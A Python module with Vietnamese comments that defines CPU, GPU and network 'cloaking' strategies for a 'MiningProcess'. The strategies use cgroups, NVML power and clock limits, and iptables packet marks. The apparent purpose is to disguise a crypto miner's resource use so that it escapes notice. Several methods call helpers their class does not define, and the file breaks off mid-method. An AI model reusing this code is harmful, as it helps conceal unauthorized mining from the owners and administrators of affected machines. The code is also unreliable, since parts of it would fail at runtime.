# cloak_strategies.py

import os
import subprocess
import psutil
import pynvml
import logging
import traceback
from abc import ABC, abstractmethod
from typing import Dict, Any, List, Tuple, Optional, Type

from .utils import MiningProcess  # Import MiningProcess từ utils.py
from .cgroup_manager import CgroupManager  # Import CgroupManager
from .resource_control import ResourceControlFactory  # Import ResourceControlFactory


class CloakStrategy(ABC):
    """
    Lớp cơ sở cho các chiến lược cloaking khác nhau.
    """

    @abstractmethod
    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking cho tiến trình đã cho trong các cgroup được chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller 
                                       (ví dụ: {'cpu': 'priority_cpu'}).
        """
        pass

    @abstractmethod
    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn tài nguyên ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn tài nguyên ban đầu.
        """
        pass


class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU:
      - Giới hạn sử dụng CPU thông qua cgroups (quota).
      - Tối ưu hóa việc sử dụng cache CPU.
      - Đặt affinity cho các thread vào các core CPU cụ thể.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        cpu_resource_manager: Any  # Thay bằng loại cụ thể nếu có
    ):
        """
        Khởi tạo CpuCloakStrategy với cấu hình, logger, CgroupManager và CPUResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking CPU.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            cpu_resource_manager (Any): Instance của CPUResourceManager từ resource_control.py.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.cpu_resource_manager = cpu_resource_manager

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking CPU cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid, process_name = self.get_process_info(process)

            cpu_cgroup = cgroups.get('cpu')
            if not cpu_cgroup:
                self.logger.error(f"Không có cgroup CPU được cung cấp cho tiến trình {process_name} (PID: {pid}).")
                return

            # Tạo cgroup CPU nếu chưa tồn tại
            if not self.cgroup_manager.cgroup_exists(cpu_cgroup):
                created = self.cgroup_manager.create_cgroup(cpu_cgroup)
                if not created:
                    self.logger.error(f"Không thể tạo cgroup CPU '{cpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                    return

                # Thêm cgroup CPU vào cgroup cha 'root'
                parent_cgroup = "root"
                success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, cpu_cgroup)
                if not success:
                    self.logger.error(f"Không thể thêm cgroup CPU '{cpu_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                    return

            # Gán tiến trình vào cgroup CPU
            success = self.cgroup_manager.assign_process_to_cgroup(pid, cpu_cgroup)
            if success:
                self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{cpu_cgroup}' cho CPU.")
            else:
                self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{cpu_cgroup}' cho CPU.")

            # Thiết lập CPU quota thông qua CPUResourceManager
            cpu_quota_us = self.calculate_cpu_quota()
            success = self.cpu_resource_manager.set_cpu_quota(cpu_cgroup, cpu_quota_us, period=100000)
            if success:
                self.logger.info(
                    f"Đặt CPU quota là {cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
                )
            else:
                self.logger.error(
                    f"Không thể đặt CPU quota là {cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
                )
                return

            # Tối ưu hóa việc sử dụng cache và đặt affinity CPU
            self.optimize_cache(pid)
            self.set_thread_affinity(pid, cgroups.get('cpuset'))

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn CPU ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn CPU ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            cpu_cgroup = original_limits.get('cgroup')
            original_cpu_quota_us = original_limits.get('cpu_quota_us')

            if not cpu_cgroup:
                self.logger.error(f"Không có thông tin cgroup CPU để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            # Khôi phục quota CPU thông qua CPUResourceManager
            if original_cpu_quota_us:
                success = self.cpu_resource_manager.set_cpu_quota(cpu_cgroup, original_cpu_quota_us, period=100000)
                if success:
                    self.logger.info(
                        f"Khôi phục CPU quota là {original_cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
                    )
                else:
                    self.logger.error(
                        f"Không thể khôi phục CPU quota là {original_cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
                    )

            # Khôi phục affinity CPU nếu cần
            if original_limits.get('cpu_affinity') and original_limits.get('cpu_threads'):
                self.set_thread_affinity(pid, original_limits.get('cpu_affinity'), original_limits.get('cpu_threads'))
                self.logger.info(
                    f"Khôi phục CPU affinity cho tiến trình {process_name} (PID: {pid}) trong cgroup '{original_limits.get('cpu_affinity')}'."
                )

            # Xóa cgroup CPU nếu cần
            self.cgroup_manager.delete_cgroup(cpu_cgroup)
            self.logger.info(f"Đã xóa cgroup CPU '{cpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def calculate_cpu_quota(self) -> int:
        """
        Tính toán quota CPU dựa trên throttle_percentage.

        Returns:
            int: CPU quota tính bằng microseconds.
        """
        cpu_period_us = 100000  # 100ms
        total_cores = psutil.cpu_count(logical=True)
        if total_cores is None:
            self.logger.error("Không thể xác định số lượng CPU cores.")
            raise ValueError("Không thể xác định số lượng CPU cores.")

        target_usage_cores = total_cores * (1 - self.throttle_percentage / 100)
        calculated_quota = int(cpu_period_us * target_usage_cores)

        return calculated_quota

    def optimize_cache(self, pid: int) -> None:
        """
        Tối ưu hóa việc sử dụng cache CPU bằng cách đặt độ ưu tiên tiến trình.

        Args:
            pid (int): PID của tiến trình.
        """
        try:
            p = psutil.Process(pid)
            if os.name == 'nt':
                p.nice(psutil.HIGH_PRIORITY_CLASS)
            else:
                p.nice(0)  # Đặt độ ưu tiên mặc định
            self.logger.info(f"Tối ưu hóa cache cho tiến trình PID {pid} bằng cách đặt độ ưu tiên.")
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {pid} không tồn tại. Không thể tối ưu hóa cache.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để tối ưu hóa cache cho PID {pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tối ưu hóa cache cho PID {pid}: {e}")

    def set_thread_affinity(self, pid: int, cpuset_cgroup: Optional[str], cpu_threads: Optional[List[int]] = None) -> None:
        """
        Đặt affinity cho thread của tiến trình bằng cách cấu hình cgroup cpuset.

        Args:
            pid (int): PID của tiến trình.
            cpuset_cgroup (Optional[str]): Tên của cgroup cpuset.
            cpu_threads (Optional[List[int]]): Danh sách các core CPU để đặt affinity.
        """
        try:
            if not cpuset_cgroup:
                self.logger.error(f"Không có cgroup cpuset được cung cấp cho PID {pid}. Không thể đặt affinity cho thread.")
                return

            # Lấy danh sách các core CPU có sẵn từ cgroup cpuset
            cpuset_path = f"/sys/fs/cgroup/cpuset/{cpuset_cgroup}/cpuset.cpus"
            if not os.path.exists(cpuset_path):
                self.logger.error(f"Đường dẫn cgroup cpuset {cpuset_path} không tồn tại.")
                return

            with open(cpuset_path, 'r') as f:
                cpus = f.read().strip()

            self.logger.debug(f"CPU cores có sẵn cho cgroup '{cpuset_cgroup}': {cpus}")

            # Phân tích chuỗi CPU (ví dụ: "0-3,5") thành danh sách các core số nguyên
            available_cpus = self.parse_cpus(cpus)
            if not available_cpus:
                self.logger.warning(f"Không tìm thấy CPU cores có sẵn trong cgroup cpuset '{cpuset_cgroup}'.")
                return

            # Nếu có danh sách cpu_threads ban đầu, sử dụng để khôi phục
            target_cpus = cpu_threads if cpu_threads else available_cpus

            # Đặt CPU affinity cho tiến trình
            p = psutil.Process(pid)
            p.cpu_affinity(target_cpus)
            self.logger.info(
                f"Đặt CPU affinity cho tiến trình PID {pid} vào các core {target_cpus} trong cgroup '{cpuset_cgroup}'."
            )

        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID={pid} không tồn tại. Không thể đặt affinity cho thread.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để đặt CPU affinity cho PID {pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi đặt affinity cho thread cho PID {pid}: {e}\n{traceback.format_exc()}")

    def parse_cpus(self, cpus_str: str) -> List[int]:
        """
        Phân tích chuỗi CPU từ cpuset.cpus và trả về danh sách các core CPU.

        Args:
            cpus_str (str): Chuỗi CPU (ví dụ: '0-3,5').

        Returns:
            List[int]: Danh sách các số core CPU.
        """
        cpus = []
        try:
            for phần in cpus_str.split(','):
                if '-' in phần:
                    bắt_đầu, kết_thúc = phần.split('-')
                    cpus.extend(range(int(bắt_đầu), int(kết_thúc) + 1))
                else:
                    cpus.append(int(phần))
        except ValueError as e:
            self.logger.error(f"Lỗi khi phân tích chuỗi CPUs '{cpus_str}': {e}")
        return cpus


class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU:
      - Giới hạn power limit của GPU.
      - Tùy chọn điều chỉnh xung nhịp GPU.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        gpu_resource_manager: Any,  # Thay bằng loại cụ thể nếu có
        gpu_initialized: bool
    ):
        """
        Khởi tạo GpuCloakStrategy với cấu hình, logger, CgroupManager và GPUResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking GPU.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            gpu_resource_manager (Any): Instance của GPUResourceManager từ resource_control.py.
            gpu_initialized (bool): Trạng thái khởi tạo GPU.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        # Lấy cấu hình usage_threshold với giá trị mặc định là 80%
        self.usage_threshold = config.get('usage_threshold', 80)
        if not isinstance(self.usage_threshold, (int, float)) or not (0 <= self.usage_threshold <= 100):
            logger.warning("Giá trị usage_threshold không hợp lệ, mặc định 80%.")
            self.usage_threshold = 80

        # Lấy cấu hình target_sm_clock và target_mem_clock với các giá trị mặc định
        self.target_sm_clock = config.get('target_sm_clock', 1200)   # MHz
        self.target_mem_clock = config.get('target_mem_clock', 800) # MHz

        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.gpu_resource_manager = gpu_resource_manager

        self.gpu_initialized = gpu_initialized

        if self.gpu_initialized:
            self.logger.info("GPUResourceManager đã được khởi tạo thành công. Sẵn sàng áp dụng cloaking GPU.")
        else:
            self.logger.warning("GPUResourceManager chưa được khởi tạo. Các chức năng cloaking GPU sẽ bị vô hiệu hóa.")

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking GPU cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        if not self.gpu_initialized:
            self.logger.warning(
                f"GPUResourceManager chưa được khởi tạo. Không thể áp dụng cloaking GPU cho tiến trình "
                f"{process.name} (PID: {process.pid})."
            )
            return

        try:
            pid, process_name = self.get_process_info(process)
            gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count

            if gpu_count == 0:
                self.logger.warning("Không tìm thấy GPU nào trên hệ thống.")
                return

            # Gán GPU dựa trên PID
            gpu_index = self.assign_gpu(pid, gpu_count)
            if gpu_index == -1:
                self.logger.warning(
                    f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid})."
                )
                return

            handle = self.gpu_resource_manager.gpu_manager.get_handle(gpu_index)

            # Lấy thông tin sử dụng GPU
            utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
            gpu_util = utilization.gpu  # %
            mem_util = utilization.memory

            self.logger.info(
                f"Hiện tại GPU sử dụng cho tiến trình {process_name} (PID: {pid}), "
                f"GPU index={gpu_index}: GPU={gpu_util}%, MEM={mem_util}%"
            )

            if gpu_util < self.usage_threshold:
                self.logger.info(
                    f"Sử dụng GPU {gpu_util}% thấp hơn ngưỡng {self.usage_threshold}%. Bỏ qua throttling GPU."
                )
                return

            # Lấy power limit hiện tại và các giới hạn
            current_power_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            min_limit_mw, max_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)

            current_power_limit_w = current_power_limit_mw / 1000
            min_w = min_limit_mw / 1000
            max_w = max_limit_mw / 1000

            # Tính power limit mới dựa trên throttle_percentage
            desired_power_limit_w = current_power_limit_w * (1 - self.throttle_percentage / 100)
            desired_power_limit_w = max(min_w, min(desired_power_limit_w, max_w))
            desired_power_limit_w = int(round(desired_power_limit_w))

            # Thiết lập power limit mới thông qua GPUResourceManager
            success = self.gpu_resource_manager.set_gpu_power_limit(gpu_index, desired_power_limit_w)
            if success:
                self.logger.info(
                    f"Đặt power limit GPU là {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
                )
            else:
                self.logger.error(
                    f"Không thể đặt power limit GPU cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
                )

            # Tùy chọn: Đặt xung nhịp GPU (SM và Memory) thông qua GPUResourceManager
            try:
                self.gpu_resource_manager.set_gpu_clocks(gpu_index, self.target_sm_clock, self.target_mem_clock)
                self.logger.info(
                    f"Đặt xung nhịp GPU: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz "
                    f"cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
                )
            except pynvml.NVMLError as e:
                self.logger.warning(
                    f"Không thể đặt xung nhịp GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
                )

            # Gán tiến trình vào cgroup GPU
            gpu_cgroup = cgroups.get('gpu')
            if gpu_cgroup:
                try:
                    # Tạo cgroup GPU nếu chưa tồn tại
                    if not self.cgroup_manager.cgroup_exists(gpu_cgroup):
                        created = self.cgroup_manager.create_cgroup(gpu_cgroup)
                        if not created:
                            self.logger.error(f"Không thể tạo cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                            return

                        # Thêm cgroup GPU vào cgroup cha 'root_gpu'
                        parent_cgroup = "root_gpu"
                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, gpu_cgroup)
                        if not success:
                            self.logger.error(f"Không thể thêm cgroup GPU '{gpu_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                            return

                    # Thiết lập các tham số GPU thông qua GPUResourceManager
                    success = self.gpu_resource_manager.set_gpu_max(gpu_cgroup, desired_power_limit_w * 1000)  # Convert W to mW
                    if success:
                        self.logger.info(
                            f"Đặt 'gpu.max' là {desired_power_limit_w * 1000} mW cho cgroup GPU '{gpu_cgroup}'."
                        )
                    else:
                        self.logger.error(
                            f"Không thể đặt 'gpu.max' cho cgroup GPU '{gpu_cgroup}'."
                        )

                    # Gán tiến trình vào cgroup GPU
                    success = self.cgroup_manager.assign_process_to_cgroup(pid, gpu_cgroup)
                    if success:
                        self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{gpu_cgroup}' cho GPU.")
                    else:
                        self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{gpu_cgroup}' cho GPU.")

                except psutil.NoSuchProcess as e:
                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup GPU: {e}")
                except psutil.AccessDenied as e:
                    self.logger.error(f"Không đủ quyền để thao tác với cgroup GPU cho PID {pid}: {e}")
                except Exception as e:
                    self.logger.error(
                        f"Lỗi khi thao tác với cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
                    )
                    raise
            else:
                self.logger.warning(f"Không có cgroup GPU được cung cấp cho tiến trình {process_name} (PID: {pid}).")

        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi NVIDIA Management Library khi áp dụng cloaking GPU: {e}")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn GPU ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn GPU ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            gpu_cgroup = original_limits.get('cgroup')
            original_power_limit_w = original_limits.get('gpu_power_limit')
            original_sm_clock = original_limits.get('target_sm_clock')
            original_mem_clock = original_limits.get('target_mem_clock')

            if not gpu_cgroup:
                self.logger.error(f"Không có thông tin cgroup GPU để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
            if gpu_count == 0:
                self.logger.warning("Không tìm thấy GPU nào trên hệ thống.")
                return

            gpu_index = self.assign_gpu(pid, gpu_count)
            if gpu_index == -1:
                self.logger.warning(
                    f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}) để khôi phục."
                )
                return

            handle = self.gpu_resource_manager.gpu_manager.get_handle(gpu_index)

            # Khôi phục power limit thông qua GPUResourceManager
            if original_power_limit_w:
                try:
                    self.gpu_resource_manager.set_gpu_power_limit(gpu_index, original_power_limit_w)
                    self.logger.info(
                        f"Khôi phục power limit GPU là {original_power_limit_w}W cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
                    )
                except pynvml.NVMLError as e:
                    self.logger.error(
                        f"Không thể khôi phục power limit GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
                    )

            # Khôi phục xung nhịp GPU (SM và Memory) thông qua GPUResourceManager
            if original_sm_clock and original_mem_clock:
                try:
                    self.gpu_resource_manager.set_gpu_clocks(gpu_index, original_sm_clock, original_mem_clock)
                    self.logger.info(
                        f"Khôi phục xung nhịp GPU: SM={original_sm_clock}MHz, MEM={original_mem_clock}MHz "
                        f"cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
                    )
                except pynvml.NVMLError as e:
                    self.logger.warning(
                        f"Không thể khôi phục xung nhịp GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
                    )

            # Khôi phục affinity CPU nếu cần
            if original_limits.get('cpu_affinity') and original_limits.get('cpu_threads'):
                self.set_thread_affinity(pid, original_limits.get('cpu_affinity'), original_limits.get('cpu_threads'))
                self.logger.info(
                    f"Khôi phục CPU affinity cho tiến trình {process_name} (PID: {pid}) trong cgroup '{original_limits.get('cpu_affinity')}'."
                )

            # Xóa cgroup GPU nếu cần
            self.cgroup_manager.delete_cgroup(gpu_cgroup)
            self.logger.info(f"Đã xóa cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")

        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi NVIDIA Management Library khi khôi phục cloaking GPU: {e}")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def assign_gpu(self, pid: int, gpu_count: int) -> int:
        """
        Gán GPU cho tiến trình dựa trên PID.

        Args:
            pid (int): PID của tiến trình.
            gpu_count (int): Số lượng GPU có sẵn.

        Returns:
            int: Chỉ số GPU được gán hoặc -1 nếu không thể gán.
        """
        # Ví dụ: gán GPU theo modulo PID với số lượng GPU
        if gpu_count <= 0:
            return -1
        return pid % gpu_count

    def get_primary_network_interface(self) -> Optional[str]:
        """
        Tự động xác định giao diện mạng chính.

        Returns:
            Optional[str]: Tên giao diện mạng hoặc None nếu không xác định được.
        """
        try:
            addrs = psutil.net_if_addrs()
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK:
                        # Giả sử giao diện có địa chỉ MAC là giao diện chính
                        return iface
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
            return None


class NetworkCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking mạng:
      - Giảm băng thông mạng cho tiến trình.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cgroup_manager: CgroupManager,
        network_resource_manager: Any  # Thay bằng loại cụ thể nếu có
    ):
        """
        Khởi tạo NetworkCloakStrategy với cấu hình, logger, CgroupManager và NetworkResourceManager.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Network.
            logger (logging.Logger): Logger để ghi log.
            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
            network_resource_manager (Any): Instance của NetworkResourceManager từ resource_control.py.
        """
        # Lấy cấu hình bandwidth_reduction_mbps với giá trị mặc định là 10Mbps
        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if not isinstance(self.bandwidth_reduction_mbps, (int, float)) or self.bandwidth_reduction_mbps <= 0:
            logger.warning("Giá trị bandwidth_reduction_mbps không hợp lệ, mặc định 10Mbps.")
            self.bandwidth_reduction_mbps = 10

        # Lấy cấu hình network_interface hoặc tự động xác định
        self.network_interface = config.get('network_interface')
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.network_resource_manager = network_resource_manager

        if not self.network_interface:
            self.network_interface = self.get_primary_network_interface()
            if not self.network_interface:
                self.logger.warning("Không thể xác định giao diện mạng. Mặc định là 'eth0'.")
                self.network_interface = "eth0"
            self.logger.info(f"Giao diện mạng chính xác định: {self.network_interface}")

    def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
        """
        Áp dụng chiến lược cloaking mạng cho tiến trình đã cho trong cgroup đã chỉ định.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Định nghĩa fwmark cho tiến trình cụ thể
            mark = pid % 32768  # fwmark phải < 65536
            self.logger.debug(f"Đặt fwmark={mark} cho tiến trình PID={pid}.")

            # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này thông qua NetworkResourceManager
            success = self.network_resource_manager.mark_packets(pid, mark)
            if not success:
                self.logger.error(
                    f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}."
                )
                return

            # Thiết lập băng thông mạng thông qua NetworkResourceManager
            success = self.network_resource_manager.limit_bandwidth(
                self.network_interface,
                mark,
                self.bandwidth_reduction_mbps
            )
            if not success:
                self.logger.error(
                    f"Không thể giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) với mark={mark} trên giao diện '{self.network_interface}'."
                )
                return

            # Gán tiến trình vào cgroup Network
            network_cgroup = cgroups.get('network')
            if network_cgroup:
                try:
                    # Tạo cgroup Network nếu chưa tồn tại
                    if not self.cgroup_manager.cgroup_exists(network_cgroup):
                        created = self.cgroup_manager.create_cgroup(network_cgroup)
                        if not created:
                            self.logger.error(f"Không thể tạo cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                            return

                        # Thêm cgroup Network vào cgroup cha 'root_network'
                        parent_cgroup = "root_network"
                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, network_cgroup)
                        if not success:
                            self.logger.error(f"Không thể thêm cgroup Network '{network_cgroup}' vào cgroup cha '{parent_cgroup}'.")
                            return

                    # Thiết lập các tham số mạng thông qua NetworkResourceManager
                    classid_value = mark
                    success = self.network_resource_manager.set_classid(network_cgroup, classid_value)
                    if success:
                        self.logger.info(
                            f"Đặt 'net_cls.classid' là {classid_value} cho cgroup Network '{network_cgroup}'."
                        )
                    else:
                        self.logger.error(
                            f"Không thể đặt 'net_cls.classid' cho cgroup Network '{network_cgroup}'."
                        )

                    # Gán tiến trình vào cgroup Network
                    success = self.cgroup_manager.assign_process_to_cgroup(pid, network_cgroup)
                    if success:
                        self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{network_cgroup}' cho Network.")
                    else:
                        self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{network_cgroup}' cho Network.")

                except psutil.NoSuchProcess as e:
                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup Network: {e}")
                except psutil.AccessDenied as e:
                    self.logger.error(f"Không đủ quyền để thao tác với cgroup Network cho PID {pid}: {e}")
                except Exception as e:
                    self.logger.error(
                        f"Lỗi khi thao tác với cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
                    )
                    raise
            else:
                self.logger.warning(f"Không có cgroup Network được cung cấp cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking mạng cho tiến trình {process_name} (PID: {pid}): "
                f"Giới hạn băng thông={self.bandwidth_reduction_mbps}Mbps trên giao diện '{self.network_interface}'."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking mạng cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
        """
        Khôi phục lại các giới hạn mạng ban đầu cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn mạng ban đầu.
        """
        try:
            pid = process.pid
            process_name = process.name

            network_cgroup = original_limits.get('cgroup')
            original_classid = original_limits.get('net_cls.classid')

            if not network_cgroup:
                self.logger.error(f"Không có thông tin cgroup Network để khôi phục cho tiến trình {process_name} (PID: {pid}).")
                return

            # Khôi phục 'net_cls.classid' thông qua NetworkResourceManager
            if original_classid:
                success = self.network_resource_manager.set_classid(network_cgroup, original_classid)
                if success:
                    self.logger.info(
                        f"Khôi phục 'net_cls.classid' là {original_classid} cho cgroup Network '{network_cgroup}'."
                    )
                else:
                    self.logger.error(
                        f"Không thể khôi phục 'net_cls.classid' cho cgroup Network '{network_cgroup}'."
                    )

            # Khôi phục băng thông mạng thông qua NetworkResourceManager
            success = self.network_resource_manager.limit_bandwidth(
                self.network_interface,
                original_classid,
                original_limits.get('bandwidth_reduction_mbps', 10)  # Giá trị mặc định nếu không có
            )
            if success:
                self.logger.info(
                    f"Khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) trên giao diện '{self.network_interface}'."
                )
            else:
                self.logger.error(
                    f"Không thể khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) trên giao diện '{self.network_interface}'."
                )

            # Xóa cgroup Network nếu cần
            self.cgroup_manager.delete_cgroup(network_cgroup)
